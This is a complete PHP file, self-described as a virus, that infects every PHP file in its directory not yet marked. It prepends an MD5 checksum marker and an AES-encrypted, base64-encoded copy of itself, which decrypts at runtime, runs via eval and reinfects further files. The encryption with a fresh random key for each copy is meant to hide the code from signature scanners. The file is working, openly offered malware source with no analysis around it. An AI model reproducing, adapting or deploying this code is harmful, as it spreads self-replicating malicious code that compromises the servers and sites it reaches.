<?php

// VIRUS:START


function execute($virus) {

	// Get a list of all PHP files on this server that this script can edit
	$filenames = glob('*.php');

	// Check each file
	foreach( $filenames as $filename ) {

		// Open file
		$script = fopen($filename, "r");
		
		// Check if not infected
		$first_line = fgets($script);
		$virus_hash = md5($filename);
		if(strpos($first_line, $virus_hash) === false) {


			//Let's write to a new file, as opposed to reading the whole script into memory, to avoid issues with larger files
			$infected = fopen("$filename.infected", "w");
		
			$checksum = '<?php // Checksum: ' . $virus_hash . ' ?>';
			$infection = '<?php ' . encryptedVirus($virus) . ' ?>';
			fputs($infected, $checksum, strlen($checksum));
			fputs($infected, $infection, strlen($infection));
			fputs($infected, $first_line, strlen($first_line));

			while( $contents = fgets($script) ) {
				fputs($infected, $contents, strlen($contents));
			}

			// Close both handles, and move the infected file to one in place
			fclose($script);
			fclose($infected);
			unlink("$filename");
			rename("$filename.infected", $filename);
		}
	}
}

function encryptedVirus($virus) {
	// Gen key
	$str = '0123456789abcdef';
	$key = '';
	for($i=0;$i<64;++$i) $key.= $str[rand(0,strlen($str)-1)];
	$key = pack('H*', $key);

	// Encrypt
	$method = 'AES-256-CBC';
	$options = 0;

	$iv_size =  openssl_cipher_iv_length($method);
	$secure = false;
	//$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
	
	$iv = openssl_random_pseudo_bytes($iv_size, $secure);
	//$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
	//while(!$secure) {
	//	$iv = openssl_random_pseudo_bytes($iv_size, $secure);
	//}

	$encryptedVirus = openssl_encrypt($virus, $method, $key, $options, $iv);

	// Encode
	$encodedVirus = base64_encode($encryptedVirus);
	$encodedIV = base64_encode($iv);
	$encodedKey = base64_encode($key);
	$cipher = base64_encode($method);
	$payload = " 
		\$encryptedVirus = '$encodedVirus'; 
		\$iv = '$encodedIV';
		\$key = '$encodedKey';
		\$method = '$cipher';
		\$virus = openssl_decrypt(base64_decode(\$encryptedVirus), base64_decode(\$method), base64_decode(\$key), 0, base64_decode(\$iv));
		eval(\$virus);
		execute(\$virus);
	";
	return $payload;	

}
//VIRUS:END

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n//VIRUS:END") + strlen("\n// VIRUS:END"));
execute($virus);

